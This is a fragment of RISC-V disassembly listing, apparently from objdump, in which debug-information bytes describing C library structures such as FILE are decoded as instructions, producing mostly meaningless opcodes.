     df8:	2600                	fld	fs0,8(a2)
     dfa:	0000003f 5d126701 	0x5d1267010000003f
     e02:	0009                	c.nop	2
     e04:	0200                	addi	s0,sp,256
     e06:	4091                	li	ra,4
     e08:	0010bc27          	fsd	ft1,24(ra)
     e0c:	0080                	addi	s0,sp,64
     e0e:	0000                	unimp
     e10:	3c00                	fld	fs0,56(s0)
     e12:	0000                	unimp
     e14:	0000                	unimp
     e16:	0000                	unimp
     e18:	2800                	fld	fs0,16(s0)
     e1a:	006a                	c.slli	zero,0x1a
     e1c:	6b01                	0x6b01
     e1e:	5d16                	lw	s10,100(sp)
     e20:	0009                	c.nop	2
     e22:	0200                	addi	s0,sp,256
     e24:	5891                	li	a7,-28
     e26:	0010c227          	fsq	ft1,4(ra)
     e2a:	0080                	addi	s0,sp,64
     e2c:	0000                	unimp
     e2e:	2200                	fld	fs0,0(a2)
     e30:	0000                	unimp
     e32:	0000                	unimp
     e34:	0000                	unimp
     e36:	2600                	fld	fs0,8(a2)
     e38:	00e4                	addi	s1,sp,76
     e3a:	0000                	unimp
     e3c:	6e01                	0x6e01
     e3e:	5d16                	lw	s10,100(sp)
     e40:	0009                	c.nop	2
     e42:	0300                	addi	s0,sp,384
     e44:	b891                	j	698 <_tbss_end+0x614>
     e46:	007f                	0x7f
     e48:	0000                	unimp
     e4a:	0000                	unimp
     e4c:	2a00                	fld	fs0,16(a2)
     e4e:	0000                	unimp
     e50:	0200                	addi	s0,sp,256
     e52:	9500                	0x9500
     e54:	0002                	c.slli64	zero
     e56:	0800                	addi	s0,sp,16
     e58:	6401                	0x6401
     e5a:	00000007          	0x7
     e5e:	0000                	unimp
     e60:	0080                	addi	s0,sp,64
     e62:	0000                	unimp
     e64:	c600                	sw	s0,8(a2)
     e66:	0001                	nop
     e68:	0080                	addi	s0,sp,64
     e6a:	0000                	unimp
     e6c:	1200                	addi	s0,sp,288
     e6e:	0006                	c.slli	zero,0x1
     e70:	4400                	lw	s0,8(s0)
     e72:	0005                	c.nop	1
     e74:	1c00                	addi	s0,sp,560
     e76:	0006                	c.slli	zero,0x1
     e78:	0100                	addi	s0,sp,128
     e7a:	2a80                	fld	fs0,16(a3)
     e7c:	0000                	unimp
     e7e:	0200                	addi	s0,sp,256
     e80:	a900                	fsd	fs0,16(a0)
     e82:	0002                	c.slli64	zero
     e84:	0800                	addi	s0,sp,16
     e86:	5c01                	li	s8,-32
     e88:	d000000b          	0xd000000b
     e8c:	0015                	c.nop	5
     e8e:	0080                	addi	s0,sp,64
     e90:	0000                	unimp
     e92:	fe00                	sd	s0,56(a2)
     e94:	0015                	c.nop	5
     e96:	0080                	addi	s0,sp,64
     e98:	0000                	unimp
     e9a:	2800                	fld	fs0,16(s0)
     e9c:	0006                	c.slli	zero,0x1
     e9e:	4400                	lw	s0,8(s0)
     ea0:	0005                	c.nop	1
     ea2:	1c00                	addi	s0,sp,560
     ea4:	0006                	c.slli	zero,0x1
     ea6:	0100                	addi	s0,sp,128
     ea8:	c680                	sw	s0,8(a3)
     eaa:	04000017          	auipc	zero,0x4000
     eae:	bd00                	fsd	fs0,56(a0)
     eb0:	0002                	c.slli64	zero
     eb2:	0800                	addi	s0,sp,16
     eb4:	7001                	c.lui	zero,0xfffe0
     eb6:	0001                	nop
     eb8:	0c00                	addi	s0,sp,528
     eba:	000006fb          	0x6fb
     ebe:	0544                	addi	s1,sp,644
     ec0:	0000                	unimp
     ec2:	15fe                	slli	a1,a1,0x3f
     ec4:	8000                	0x8000
     ec6:	0000                	unimp
     ec8:	0000                	unimp
     eca:	1214                	addi	a3,sp,288
     ecc:	0000                	unimp
     ece:	0000                	unimp
     ed0:	0000                	unimp
     ed2:	0be8                	addi	a0,sp,476
     ed4:	0000                	unimp
     ed6:	0102                	c.slli64	sp
     ed8:	dd06                	sw	ra,184(sp)
     eda:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     ede:	0801                	addi	a6,a6,0
     ee0:	000003db          	0x3db
     ee4:	0202                	c.slli64	tp
     ee6:	0005                	c.nop	1
     ee8:	0004                	0x4
     eea:	0200                	addi	s0,sp,256
     eec:	0702                	c.slli64	a4
     eee:	02a4                	addi	s1,sp,328
     ef0:	0000                	unimp
     ef2:	69050403          	lb	s0,1680(a0)
     ef6:	746e                	ld	s0,248(sp)
     ef8:	0400                	addi	s0,sp,512
     efa:	0049                	c.nop	18
     efc:	0000                	unimp
     efe:	5005                	c.li	zero,-31
     f00:	0000                	unimp
     f02:	0500                	addi	s0,sp,640
     f04:	0049                	c.nop	18
     f06:	0000                	unimp
     f08:	0402                	c.slli64	s0
     f0a:	00007d07          	0x7d07
     f0e:	0200                	addi	s0,sp,256
     f10:	0508                	addi	a0,sp,640
     f12:	000000f3          	0xf3
     f16:	a006                	fsd	ft1,0(sp)
     f18:	04000003          	lb	zero,64(zero) # 40 <buf.2990>
     f1c:	1969                	addi	s2,s2,-6
     f1e:	0079                	c.nop	30
     f20:	0000                	unimp
     f22:	0802                	c.slli64	a6
     f24:	00007807          	0x7807
     f28:	0600                	addi	s0,sp,768
     f2a:	07df 0000 e804      	0xe804000007df
     f30:	791a                	ld	s2,416(sp)
     f32:	0000                	unimp
     f34:	0600                	addi	s0,sp,768
     f36:	03a2                	slli	t2,t2,0x8
     f38:	0000                	unimp
     f3a:	3c05                	addiw	s8,s8,-31
     f3c:	6d14                	ld	a3,24(a0)
     f3e:	0000                	unimp
     f40:	0400                	addi	s0,sp,512
     f42:	008c                	addi	a1,sp,64
     f44:	0000                	unimp
     f46:	e106                	sd	ra,128(sp)
     f48:	05000007          	0x5000007
     f4c:	1552                	slli	a0,a0,0x34
     f4e:	0080                	addi	s0,sp,64
     f50:	0000                	unimp
     f52:	9d05                	subw	a0,a0,s1
     f54:	0000                	unimp
     f56:	0600                	addi	s0,sp,768
     f58:	0589                	addi	a1,a1,2
     f5a:	0000                	unimp
     f5c:	d106                	sw	ra,160(sp)
     f5e:	00007917          	auipc	s2,0x7
     f62:	0200                	addi	s0,sp,256
     f64:	0508                	addi	a0,sp,640
     f66:	00ee                	slli	ra,ra,0x1b
     f68:	0000                	unimp
     f6a:	1002                	c.slli	zero,0x20
     f6c:	4504                	lw	s1,8(a0)
     f6e:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     f72:	02f2                	slli	t0,t0,0x1c
     f74:	0000                	unimp
     f76:	5e06                	lw	t3,96(sp)
     f78:	1701                	addi	a4,a4,-32
     f7a:	005f 0000 8b06      	0x8b060000005f
     f80:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     f84:	0e2e                	slli	t3,t3,0xb
     f86:	0066                	c.slli	zero,0x19
     f88:	0000                	unimp
     f8a:	bc06                	fsd	ft1,56(sp)
     f8c:	0004                	0x4
     f8e:	0700                	addi	s0,sp,896
     f90:	0e74                	addi	a3,sp,796
     f92:	0066                	c.slli	zero,0x19
     f94:	0000                	unimp
     f96:	8706                	mv	a4,ra
     f98:	0005                	c.nop	1
     f9a:	0700                	addi	s0,sp,896
     f9c:	00661793          	slli	a5,a2,0x6
     fa0:	0000                	unimp
     fa2:	0408                	addi	a0,sp,512
     fa4:	1b03a507          	flw	fa0,432(t2)
     fa8:	0001                	nop
     faa:	0900                	addi	s0,sp,144
     fac:	02ec                	addi	a1,sp,332
     fae:	0000                	unimp
     fb0:	c80ca707          	flw	fa4,-896(s9)
     fb4:	0000                	unimp
     fb6:	0900                	addi	s0,sp,144
     fb8:	0272                	slli	tp,tp,0x1c
     fba:	0000                	unimp
     fbc:	1b13a807          	flw	fa6,433(t2)
     fc0:	0001                	nop
     fc2:	0000                	unimp
     fc4:	340a                	fld	fs0,160(sp)
     fc6:	0000                	unimp
     fc8:	2b00                	fld	fs0,16(a4)
     fca:	0001                	nop
     fcc:	0b00                	addi	s0,sp,400
     fce:	0079                	c.nop	30
     fd0:	0000                	unimp
     fd2:	080c0003          	lb	zero,128(s8) # 5084a <_tbss_end+0x507c6>
     fd6:	4f09a207          	flw	ft4,1264(s3)
     fda:	0001                	nop
     fdc:	0d00                	addi	s0,sp,656
     fde:	04a6                	slli	s1,s1,0x9
     fe0:	0000                	unimp
     fe2:	4907a407          	flw	fs0,1168(a5)
     fe6:	0000                	unimp
     fe8:	0000                	unimp
     fea:	ae0d                	j	131c <_tbss_end+0x1298>
     fec:	0004                	0x4
     fee:	0700                	addi	s0,sp,896
     ff0:	05a9                	addi	a1,a1,10
     ff2:	00f9                	addi	ra,ra,30
     ff4:	0000                	unimp
     ff6:	0004                	0x4
     ff8:	2806                	fld	fa6,64(sp)
     ffa:	0004                	0x4
     ffc:	0700                	addi	s0,sp,896
     ffe:	03aa                	slli	t2,t2,0xa
    1000:	0000012b          	0x12b
    1004:	080e                	slli	a6,a6,0x3
    1006:	088d080f          	0x88d080f
    100a:	0000                	unimp
    100c:	0406                	slli	s0,s0,0x1
    100e:	0005                	c.nop	1
    1010:	0800                	addi	s0,sp,16
    1012:	1919                	addi	s2,s2,-26
    1014:	005f 0000 bc06      	0xbc060000005f
    101a:	09000003          	lb	zero,144(zero) # 90 <_tbss_end+0xc>
    101e:	0d0c                	addi	a1,sp,656
    1020:	0049                	c.nop	18
    1022:	0000                	unimp
    1024:	2906                	fld	fs2,64(sp)
    1026:	0002                	c.slli64	zero
    1028:	0800                	addi	s0,sp,16
    102a:	016f1b23          	sh	s6,22(t5)
    102e:	0000                	unimp
    1030:	3a10                	fld	fa2,48(a2)
    1032:	0002                	c.slli64	zero
    1034:	2000                	fld	fs0,0(s0)
    1036:	3408                	fld	fa0,40(s0)
    1038:	e108                	sd	a0,0(a0)
    103a:	0001                	nop
    103c:	0d00                	addi	s0,sp,656
    103e:	0449                	addi	s0,s0,18
    1040:	0000                	unimp
    1042:	3608                	fld	fa0,40(a2)
    1044:	0001e113          	ori	sp,gp,0
    1048:	0000                	unimp
    104a:	5f11                	li	t5,-28
    104c:	3708006b          	0x3708006b
    1050:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1054:	0800                	addi	s0,sp,16
    1056:	910d                	srli	a0,a0,0x23
    1058:	0004                	0x4
    105a:	0800                	addi	s0,sp,16
    105c:	00490b37          	lui	s6,0x490
    1060:	0000                	unimp
    1062:	0d0c                	addi	a1,sp,656
    1064:	021d                	addi	tp,tp,7
    1066:	0000                	unimp
    1068:	3708                	fld	fa0,40(a4)
    106a:	4914                	lw	a3,16(a0)
    106c:	0000                	unimp
    106e:	1000                	addi	s0,sp,32
    1070:	720d                	lui	tp,0xfffe3
    1072:	0005                	c.nop	1
    1074:	0800                	addi	s0,sp,16
    1076:	00491b37          	lui	s6,0x491
    107a:	0000                	unimp
    107c:	1114                	addi	a3,sp,160
    107e:	785f 0800 0b38      	0xb380800785f
    1084:	000001e7          	jalr	gp,zero # 0 <_tdata_begin>
    1088:	0018                	0x18
    108a:	0812                	slli	a6,a6,0x4
    108c:	00000187          	0x187
    1090:	630a                	ld	t1,128(sp)
    1092:	0001                	nop
    1094:	f700                	sd	s0,40(a4)
    1096:	0001                	nop
    1098:	0b00                	addi	s0,sp,400
    109a:	0079                	c.nop	30
    109c:	0000                	unimp
    109e:	0000                	unimp
    10a0:	6110                	ld	a2,0(a0)
    10a2:	0002                	c.slli64	zero
    10a4:	2400                	fld	fs0,8(s0)
    10a6:	3c08                	fld	fa0,56(s0)
    10a8:	7a08                	ld	a0,48(a2)
    10aa:	0002                	c.slli64	zero
    10ac:	0d00                	addi	s0,sp,656
    10ae:	000000db          	0xdb
    10b2:	3e08                	fld	fa0,56(a2)
    10b4:	4909                	li	s2,2
    10b6:	0000                	unimp
    10b8:	0000                	unimp
    10ba:	c40d                	beqz	s0,10e4 <_tbss_end+0x1060>
    10bc:	0004                	0x4
    10be:	0800                	addi	s0,sp,16
    10c0:	0049093f 0d040000 	0xd0400000049093f
    10c8:	010e                	slli	sp,sp,0x3
    10ca:	0000                	unimp
    10cc:	4008                	lw	a0,0(s0)
    10ce:	4909                	li	s2,2
    10d0:	0000                	unimp
    10d2:	0800                	addi	s0,sp,16
    10d4:	080d                	addi	a6,a6,3
    10d6:	0006                	c.slli	zero,0x1
    10d8:	0800                	addi	s0,sp,16
    10da:	0941                	addi	s2,s2,16
    10dc:	0049                	c.nop	18
    10de:	0000                	unimp
    10e0:	0d0c                	addi	a1,sp,656
    10e2:	0365                	addi	t1,t1,25
    10e4:	0000                	unimp
    10e6:	4208                	lw	a0,0(a2)
    10e8:	4909                	li	s2,2
    10ea:	0000                	unimp
    10ec:	1000                	addi	s0,sp,32
    10ee:	190d                	addi	s2,s2,-29
    10f0:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    10f4:	00490943          	fmadd.s	fs2,fs2,ft4,ft0,rne
    10f8:	0000                	unimp
    10fa:	0d14                	addi	a3,sp,656
    10fc:	00000577          	0x577
    1100:	4408                	lw	a0,8(s0)
    1102:	4909                	li	s2,2
    1104:	0000                	unimp
    1106:	1800                	addi	s0,sp,48
    1108:	0a0d                	addi	s4,s4,3
    110a:	0004                	0x4
    110c:	0800                	addi	s0,sp,16
    110e:	0945                	addi	s2,s2,17
    1110:	0049                	c.nop	18
    1112:	0000                	unimp
    1114:	0d1c                	addi	a5,sp,656
    1116:	05b2                	slli	a1,a1,0xc
    1118:	0000                	unimp
    111a:	4608                	lw	a0,8(a2)
    111c:	4909                	li	s2,2
    111e:	0000                	unimp
    1120:	2000                	fld	fs0,0(s0)
    1122:	1300                	addi	s0,sp,416
    1124:	011d                	addi	sp,sp,7
    1126:	0000                	unimp
    1128:	0208                	addi	a0,sp,256
    112a:	4f08                	lw	a0,24(a4)
    112c:	c008                	sw	a0,0(s0)
    112e:	0002                	c.slli64	zero
    1130:	0d00                	addi	s0,sp,656
    1132:	0210                	addi	a2,sp,256
    1134:	0000                	unimp
    1136:	5008                	lw	a0,32(s0)
    1138:	c00a                	sw	sp,0(sp)
    113a:	0002                	c.slli64	zero
    113c:	0000                	unimp
    113e:	9114                	0x9114
    1140:	0002                	c.slli64	zero
    1142:	0800                	addi	s0,sp,16
    1144:	0951                	addi	s2,s2,20
    1146:	02c0                	addi	s0,sp,324
    1148:	0000                	unimp
    114a:	0100                	addi	s0,sp,128
    114c:	f614                	sd	a3,40(a2)
    114e:	0004                	0x4
    1150:	0800                	addi	s0,sp,16
    1152:	01630a53          	fadd.s	fs4,ft6,fs6,rne
    1156:	0000                	unimp
    1158:	0200                	addi	s0,sp,256
    115a:	4c14                	lw	a3,24(s0)
    115c:	0001                	nop
    115e:	0800                	addi	s0,sp,16
    1160:	0a56                	slli	s4,s4,0x15
    1162:	00000163          	beqz	zero,1164 <_tbss_end+0x10e0>
    1166:	0204                	addi	s1,sp,256
    1168:	0a00                	addi	s0,sp,272
    116a:	0000015b          	0x15b
    116e:	02d0                	addi	a2,sp,324
    1170:	0000                	unimp
    1172:	0000790b          	0x790b
    1176:	1f00                	addi	s0,sp,944
    1178:	1300                	addi	s0,sp,416
    117a:	036e                	slli	t1,t1,0x1b
    117c:	0000                	unimp
    117e:	0318                	addi	a4,sp,384
    1180:	6208                	ld	a0,0(a2)
    1182:	1408                	addi	a0,sp,544
    1184:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    1188:	0449                	addi	s0,s0,18
    118a:	0000                	unimp
    118c:	6308                	ld	a0,0(a4)
    118e:	1412                	slli	s0,s0,0x24
    1190:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1194:	610d                	addi	sp,sp,160
    1196:	0004                	0x4
    1198:	0800                	addi	s0,sp,16
    119a:	0664                	addi	s1,sp,780
    119c:	0049                	c.nop	18
    119e:	0000                	unimp
    11a0:	0d08                	addi	a0,sp,656
    11a2:	0218                	addi	a4,sp,256
    11a4:	0000                	unimp
    11a6:	6608                	ld	a0,8(a2)
    11a8:	1a09                	addi	s4,s4,-30
    11aa:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
    11ae:	1d14                	addi	a3,sp,688
    11b0:	0001                	nop
    11b2:	0800                	addi	s0,sp,16
    11b4:	027a1e67          	0x27a1e67
    11b8:	0000                	unimp
    11ba:	0110                	addi	a2,sp,128
    11bc:	1200                	addi	s0,sp,288
    11be:	d008                	sw	a0,32(s0)
    11c0:	0002                	c.slli64	zero
    11c2:	0a00                	addi	s0,sp,272
    11c4:	032a                	slli	t1,t1,0xa
    11c6:	0000                	unimp
    11c8:	032a                	slli	t1,t1,0xa
    11ca:	0000                	unimp
    11cc:	0000790b          	0x790b
    11d0:	1f00                	addi	s0,sp,944
    11d2:	1200                	addi	s0,sp,288
    11d4:	3008                	fld	fa0,32(s0)
    11d6:	15000003          	lb	zero,336(zero) # 150 <_tbss_end+0xcc>
    11da:	1410                	addi	a2,sp,544
    11dc:	0004                	0x4
    11de:	1000                	addi	s0,sp,32
    11e0:	7a08                	ld	a0,48(a2)
    11e2:	5908                	lw	a0,48(a0)
    11e4:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    11e8:	0102                	c.slli64	sp
    11ea:	0000                	unimp
    11ec:	7b08                	ld	a0,48(a4)
    11ee:	5911                	li	s2,-28
    11f0:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    11f4:	7a0d                	lui	s4,0xfffe3
    11f6:	0006                	c.slli	zero,0x1
    11f8:	0800                	addi	s0,sp,16
    11fa:	067c                	addi	a5,sp,780
    11fc:	0049                	c.nop	18
    11fe:	0000                	unimp
    1200:	0008                	0x8
    1202:	0812                	slli	a6,a6,0x4
    1204:	0034                	addi	a3,sp,8
    1206:	0000                	unimp
    1208:	3310                	fld	fa2,32(a4)
    120a:	0004                	0x4
    120c:	b000                	fsd	fs0,32(s0)
    120e:	ba08                	fsd	fa0,48(a2)
    1210:	a208                	fsd	fa0,0(a2)
    1212:	0004                	0x4
    1214:	1100                	addi	s0,sp,160
    1216:	705f 0800 12bb      	0x12bb0800705f
    121c:	0359                	addi	t1,t1,22
    121e:	0000                	unimp
    1220:	1100                	addi	s0,sp,160
    1222:	725f 0800 07bc      	0x7bc0800725f
    1228:	0049                	c.nop	18
    122a:	0000                	unimp
    122c:	1108                	addi	a0,sp,160
    122e:	775f 0800 07bd      	0x7bd0800775f
    1234:	0049                	c.nop	18
    1236:	0000                	unimp
    1238:	0d0c                	addi	a1,sp,656
    123a:	0145                	addi	sp,sp,17
    123c:	0000                	unimp
    123e:	be08                	fsd	fa0,56(a2)
    1240:	3b09                	addiw	s6,s6,-30
    1242:	0000                	unimp
    1244:	1000                	addi	s0,sp,32
    1246:	6c0d                	lui	s8,0x3
    1248:	0005                	c.nop	1
    124a:	0800                	addi	s0,sp,16
    124c:	003b09bf 11120000 	0x11120000003b09bf
    1254:	625f 0066 c008      	0xc0080066625f
    125a:	3111                	addiw	sp,sp,-28
    125c:	18000003          	lb	zero,384(zero) # 180 <_tbss_end+0xfc>
    1260:	8a0d                	andi	a2,a2,3
    1262:	0000                	unimp
    1264:	0800                	addi	s0,sp,16
    1266:	07c1                	addi	a5,a5,16
    1268:	0049                	c.nop	18
    126a:	0000                	unimp
    126c:	0d28                	addi	a0,sp,664
    126e:	0135                	addi	sp,sp,13
    1270:	0000                	unimp
    1272:	c808                	sw	a0,16(s0)
    1274:	5b0a                	lw	s6,160(sp)
    1276:	0001                	nop
    1278:	3000                	fld	fs0,32(s0)
    127a:	510d                	li	sp,-29
    127c:	0002                	c.slli64	zero
    127e:	0800                	addi	s0,sp,16
    1280:	1dca                	slli	s11,s11,0x32
    1282:	0626                	slli	a2,a2,0x9
    1284:	0000                	unimp
    1286:	0d38                	addi	a4,sp,664
    1288:	0312                	slli	t1,t1,0x4
    128a:	0000                	unimp
    128c:	cc08                	sw	a0,24(s0)
    128e:	501d                	c.li	zero,-25
    1290:	0006                	c.slli	zero,0x1
    1292:	4000                	lw	s0,0(s0)
    1294:	b60d                	j	db6 <_tbss_end+0xd32>
    1296:	0004                	0x4
    1298:	0800                	addi	s0,sp,16
    129a:	06740dcf          	fnmadd.q	fs11,fs0,ft7,ft0,rne
    129e:	0000                	unimp
    12a0:	0d48                	addi	a0,sp,660
    12a2:	05cc                	addi	a1,sp,708
    12a4:	0000                	unimp
    12a6:	d008                	sw	a0,32(s0)
    12a8:	8e09                	sub	a2,a2,a0
    12aa:	0006                	c.slli	zero,0x1
    12ac:	5000                	lw	s0,32(s0)
    12ae:	5f11                	li	t5,-28
    12b0:	6275                	lui	tp,0x1d
    12b2:	0800                	addi	s0,sp,16
    12b4:	033111d3          	fadd.d	ft3,ft2,fs3,rtz
    12b8:	0000                	unimp
    12ba:	1158                	addi	a4,sp,164
    12bc:	755f 0070 d408      	0xd4080070755f
    12c2:	5912                	lw	s2,36(sp)
    12c4:	68000003          	lb	zero,1664(zero) # 680 <_tbss_end+0x5fc>
    12c8:	5f11                	li	t5,-28
    12ca:	7275                	lui	tp,0xffffd
    12cc:	0800                	addi	s0,sp,16
    12ce:	07d5                	addi	a5,a5,21
    12d0:	0049                	c.nop	18
    12d2:	0000                	unimp
    12d4:	0d70                	addi	a2,sp,668
    12d6:	00fc                	addi	a5,sp,76
    12d8:	0000                	unimp
    12da:	d808                	sw	a0,48(s0)
    12dc:	9411                	srai	s0,s0,0x24
    12de:	0006                	c.slli	zero,0x1
    12e0:	7400                	ld	s0,40(s0)
    12e2:	a40d                	j	1504 <_tbss_end+0x1480>
    12e4:	0005                	c.nop	1
    12e6:	0800                	addi	s0,sp,16
    12e8:	11d9                	addi	gp,gp,-10
    12ea:	06a4                	addi	s1,sp,840
    12ec:	0000                	unimp
    12ee:	6c5f1177          	0x6c5f1177
    12f2:	0062                	c.slli	zero,0x18
    12f4:	dc08                	sw	a0,56(s0)
    12f6:	3111                	addiw	sp,sp,-28
    12f8:	78000003          	lb	zero,1920(zero) # 780 <_tbss_end+0x6fc>
    12fc:	670d                	lui	a4,0x3
    12fe:	0001                	nop
    1300:	0800                	addi	s0,sp,16
    1302:	07df 0049 0000      	0x4907df
    1308:	0d88                	addi	a0,sp,720
    130a:	01e9                	addi	gp,gp,26
    130c:	0000                	unimp
    130e:	e008                	sd	a0,0(s0)
    1310:	d50a                	sw	sp,168(sp)
    1312:	0000                	unimp
    1314:	9000                	0x9000
    1316:	3d0d                	addiw	s10,s10,-29
    1318:	0006                	c.slli	zero,0x1
    131a:	0800                	addi	s0,sp,16
    131c:	04c012e3          	bne	zero,a2,1b60 <_tbss_end+0x1adc>
    1320:	0000                	unimp
    1322:	0d98                	addi	a4,sp,720
    1324:	02f9                	addi	t0,t0,30
    1326:	0000                	unimp
    1328:	e708                	sd	a0,8(a4)
    132a:	7b0c                	ld	a1,48(a4)
    132c:	0001                	nop
    132e:	a000                	fsd	fs0,0(s0)
    1330:	3b0d                	addiw	s6,s6,-29
    1332:	0004                	0x4
    1334:	0800                	addi	s0,sp,16
    1336:	0ee9                	addi	t4,t4,26
    1338:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    133c:	0da4                	addi	s1,sp,728
    133e:	02ff                	0x2ff
    1340:	0000                	unimp
    1342:	ea08                	sd	a0,16(a2)
    1344:	4909                	li	s2,2
    1346:	0000                	unimp
    1348:	ac00                	fsd	fs0,24(s0)
    134a:	1600                	addi	s0,sp,800
    134c:	00ed                	addi	ra,ra,27
    134e:	0000                	unimp
    1350:	04c0                	addi	s0,sp,580
    1352:	0000                	unimp
    1354:	0004c017          	auipc	zero,0x4c
    1358:	1700                	addi	s0,sp,928
    135a:	0000015b          	0x15b
    135e:	00061417          	auipc	s0,0x61
    1362:	1700                	addi	s0,sp,928
    1364:	0049                	c.nop	18
    1366:	0000                	unimp
    1368:	1200                	addi	s0,sp,288
    136a:	cb08                	sw	a0,16(a4)
    136c:	0004                	0x4
    136e:	0500                	addi	s0,sp,640
    1370:	04c0                	addi	s0,sp,580
    1372:	0000                	unimp
    1374:	9918                	0x9918
    1376:	0004                	0x4
    1378:	4800                	lw	s0,16(s0)
    137a:	02650807          	0x2650807
    137e:	1408                	addi	a0,sp,544
    1380:	0006                	c.slli	zero,0x1
    1382:	1900                	addi	s0,sp,176
    1384:	03f9                	addi	t2,t2,30
    1386:	0000                	unimp
    1388:	6708                	ld	a0,8(a4)
    138a:	0702                	c.slli64	a4
    138c:	0049                	c.nop	18
    138e:	0000                	unimp
    1390:	1900                	addi	s0,sp,176
    1392:	0154                	addi	a3,sp,132
    1394:	0000                	unimp
    1396:	6c08                	ld	a0,24(s0)
    1398:	0b02                	c.slli64	s6
    139a:	0700                	addi	s0,sp,896
    139c:	0000                	unimp
    139e:	1908                	addi	a0,sp,176
    13a0:	0279                	addi	tp,tp,30
    13a2:	0000                	unimp
    13a4:	6c08                	ld	a0,24(s0)
    13a6:	1402                	slli	s0,s0,0x20
    13a8:	0700                	addi	s0,sp,896
    13aa:	0000                	unimp
    13ac:	1910                	addi	a2,sp,176
    13ae:	0232                	slli	tp,tp,0xc
    13b0:	0000                	unimp
    13b2:	6c08                	ld	a0,24(s0)
    13b4:	1e02                	slli	t3,t3,0x20
    13b6:	0700                	addi	s0,sp,896
    13b8:	0000                	unimp
    13ba:	1918                	addi	a4,sp,176
    13bc:	045c                	addi	a5,sp,516
    13be:	0000                	unimp
    13c0:	6e08                	ld	a0,24(a2)
    13c2:	0802                	c.slli64	a6
    13c4:	0049                	c.nop	18
    13c6:	0000                	unimp
    13c8:	1920                	addi	s0,sp,184
    13ca:	002a                	c.slli	zero,0xa
    13cc:	0000                	unimp
    13ce:	6f08                	ld	a0,24(a4)
    13d0:	0802                	c.slli64	a6
    13d2:	0909                	addi	s2,s2,2
    13d4:	0000                	unimp
    13d6:	1924                	addi	s1,sp,184
    13d8:	0478                	addi	a4,sp,524
    13da:	0000                	unimp
    13dc:	7208                	ld	a0,32(a2)
    13de:	0702                	c.slli64	a4
    13e0:	0049                	c.nop	18
    13e2:	0000                	unimp
    13e4:	1940                	addi	s0,sp,180
    13e6:	0466                	slli	s0,s0,0x19
    13e8:	0000                	unimp
    13ea:	7308                	ld	a0,32(a4)
    13ec:	1602                	slli	a2,a2,0x20
    13ee:	091e                	slli	s2,s2,0x7
    13f0:	0000                	unimp
    13f2:	1948                	addi	a0,sp,180
    13f4:	0380                	addi	s0,sp,448
    13f6:	0000                	unimp
    13f8:	7508                	ld	a0,40(a0)
    13fa:	0702                	c.slli64	a4
    13fc:	0049                	c.nop	18
    13fe:	0000                	unimp
    1400:	1950                	addi	a2,sp,180
    1402:	046e                	slli	s0,s0,0x1b
    1404:	0000                	unimp
    1406:	7708                	ld	a0,40(a4)
    1408:	0a02                	c.slli64	s4
    140a:	0000092f          	0x92f
    140e:	1958                	addi	a4,sp,180
    1410:	02e4                	addi	s1,sp,332
    1412:	0000                	unimp
    1414:	7a08                	ld	a0,48(a2)
    1416:	1302                	slli	t1,t1,0x20
    1418:	01e1                	addi	gp,gp,24
    141a:	0000                	unimp
    141c:	1960                	addi	s0,sp,188
    141e:	00000257          	0x257
    1422:	7b08                	ld	a0,48(a4)
    1424:	0702                	c.slli64	a4
    1426:	0049                	c.nop	18
    1428:	0000                	unimp
    142a:	1968                	addi	a0,sp,188
    142c:	05f4                	addi	a3,sp,716
    142e:	0000                	unimp
    1430:	7c08                	ld	a0,56(s0)
    1432:	1302                	slli	t1,t1,0x20
    1434:	01e1                	addi	gp,gp,24
    1436:	0000                	unimp
    1438:	1970                	addi	a2,sp,188
    143a:	03b2                	slli	t2,t2,0xc
    143c:	0000                	unimp
    143e:	7d08                	ld	a0,56(a0)
    1440:	1402                	slli	s0,s0,0x20
    1442:	0935                	addi	s2,s2,13
    1444:	0000                	unimp
    1446:	1978                	addi	a4,sp,188
    1448:	0281                	addi	t0,t0,0
    144a:	0000                	unimp
    144c:	8008                	0x8008
    144e:	0702                	c.slli64	a4
    1450:	0049                	c.nop	18
    1452:	0000                	unimp
    1454:	1980                	addi	s0,sp,240
    1456:	01e1                	addi	gp,gp,24
    1458:	0000                	unimp
    145a:	8108                	0x8108
    145c:	0902                	c.slli64	s2
    145e:	0614                	addi	a3,sp,768
    1460:	0000                	unimp
    1462:	1988                	addi	a0,sp,240
    1464:	03f2                	slli	t2,t2,0x1c
    1466:	0000                	unimp
    1468:	a408                	fsd	fa0,8(s0)
    146a:	0702                	c.slli64	a4
    146c:	000008e3          	beqz	zero,1c7c <_tbss_end+0x1bf8>
    1470:	1a90                	addi	a2,sp,368
    1472:	036e                	slli	t1,t1,0x1b
    1474:	0000                	unimp
    1476:	a808                	fsd	fa0,16(s0)
    1478:	1302                	slli	t1,t1,0x20
    147a:	0314                	addi	a3,sp,384
    147c:	0000                	unimp
    147e:	01f8                	addi	a4,sp,204
    1480:	b71a                	fsd	ft6,424(sp)
    1482:	0002                	c.slli64	zero
    1484:	0800                	addi	s0,sp,16
    1486:	02a9                	addi	t0,t0,10
    1488:	d012                	sw	tp,32(sp)
    148a:	0002                	c.slli64	zero
    148c:	0000                	unimp
    148e:	1a02                	slli	s4,s4,0x20
    1490:	059a                	slli	a1,a1,0x6
    1492:	0000                	unimp
    1494:	ad08                	fsd	fa0,24(a0)
    1496:	0c02                	c.slli64	s8
    1498:	0946                	slli	s2,s2,0x11
    149a:	0000                	unimp
    149c:	0518                	addi	a4,sp,640
    149e:	3d1a                	fld	fs10,416(sp)
    14a0:	0001                	nop
    14a2:	0800                	addi	s0,sp,16
    14a4:	02b2                	slli	t0,t0,0xc
    14a6:	c110                	sw	a2,0(a0)
    14a8:	0006                	c.slli	zero,0x1
    14aa:	2000                	fld	fs0,0(s0)
    14ac:	1a05                	addi	s4,s4,-31
    14ae:	0118                	addi	a4,sp,128
    14b0:	0000                	unimp
    14b2:	b408                	fsd	fa0,40(s0)
    14b4:	0a02                	c.slli64	s4
